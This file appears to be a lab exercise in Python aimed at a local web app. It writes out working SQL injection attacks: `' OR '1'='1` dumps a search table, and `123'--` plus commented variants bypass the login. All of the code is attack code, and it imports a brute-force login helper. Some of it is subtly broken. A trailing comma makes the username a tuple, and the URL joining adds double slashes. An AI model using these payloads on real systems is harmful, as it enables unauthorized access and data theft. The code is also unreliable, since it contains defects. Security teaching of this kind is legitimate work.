import requests
from bs4 import BeautifulSoup
from brute_force_attack import attempt_login

# Web URL Configuration
base_url = 'http://127.0.0.1:5000/'
login_url = f'{base_url}/signin'
search_url = f'{base_url}/search'

def sql_injection(session):
    sql_injection = "' OR '1'='1"
    products_list = []
    # Implement continuous search as attack want
    response = session.post(search_url, data={'product_name': sql_injection})
    if response.status_code == 200:
        soup = BeautifulSoup(response.text, 'html.parser')
        table = soup.find('table')
        for row in table.find_all('tr'):
            cells = row.find_all('td')
            if len(cells) == 3:
                products_list.append(cells[0].text.strip())
    return products_list

def sql_login():
    # required login information
    # # 1. One normal login example, which shall corresponding to username = 123, user_id = 1
    # credentials = {
    #     'username': "123",
    #     'password': '123'
    # }

    # 2. SQL injection (assume you know the username): targeting the username
    # The result should be username = 123, user_id = 1
    username = "123'--",
    password = ''

    # 3. SQL injection (assume you know the username): targeting the password
    # The result should be username = 1234, user_id = 2
    # credentials = {
    #     'username': "1234",
    #     'password': "' OR '1'=='1"
    # }

    # 4. SQL injection (assume you don't know the username and password)
    # The result should be username = 123, user_id = 1
    # credentials = {
    #     'username': "' OR '1'=='1",
    #     'password': "' OR '1'=='1"
    # }

    logged_in, session = attempt_login(username, password)

    return logged_in, session
